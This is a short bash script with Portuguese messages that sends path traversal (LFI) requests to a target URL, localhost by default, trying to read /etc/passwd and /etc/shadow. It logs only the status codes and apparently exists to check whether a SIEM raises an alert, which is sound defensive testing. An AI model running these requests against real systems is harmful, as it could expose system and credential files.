#!/usr/bin/env bash

set -euo pipefail
TARGET="${1:-http://localhost}"
echo "🚨 Ataque: Path Traversal (LFI)"
echo "  Alvo: $TARGET"
for payload in \
    "/api/produtos/../../../etc/passwd" \
    "/api/produtos/..%2f..%2f..%2fetc/passwd" \
    "/api/produtos/../../../etc/shadow"; do
    echo "  -> $payload"
    curl -s -o /dev/null -w "     HTTP %{http_code}\n" "$TARGET$payload"
done
echo "  ✔ LFI concluído (verifique alerta no SIEM)"
